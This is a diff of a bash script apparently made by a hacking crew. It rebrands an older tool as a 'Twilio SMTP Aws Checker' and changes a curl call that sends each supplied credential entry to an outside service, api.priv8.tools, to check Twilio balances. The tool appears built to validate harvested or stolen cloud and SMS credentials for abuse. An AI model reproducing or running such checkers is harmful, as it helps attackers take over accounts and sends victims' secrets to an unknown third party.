@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# NakoCode x TatsumiCREW Family 
+# Updated By WahyuXploit
 # 26-July-2020
 clear
 
@@ -37,7 +37,7 @@ updater
 esac
 done
 TwilliocURL(){
-	gET=$(curl -skL --connect-timeout 15 --max-time 15 "http://api.priv8.tools/twilio_balance/api.php?list=$1" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
+	gET=$(curl -skL --connect-timeout 15 --max-time 15 "https://api.priv8.tools/twilio_balance/api.php?list=$1" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
 }
 TwilioREsulT(){
 	TwilliocURL $1
@@ -169,8 +169,8 @@ cat << "EOF"
      Y       )( / /(,/
     ,|      /     )
    ( |     /     /
-    " \_  (__   (__        [Gabut Tools V0.5 By Tatsumi-Crew.NET]
-        "-._,)--._,)       [ Thanks For IDLIVE - Monkey B Luffy ]
+    " \_  (__   (__            [Twilio SMTP Aws Checker]
+        "-._,)--._,)                    [ Thanks For God ]
 EOF
 echo ""
 echo "Method : "
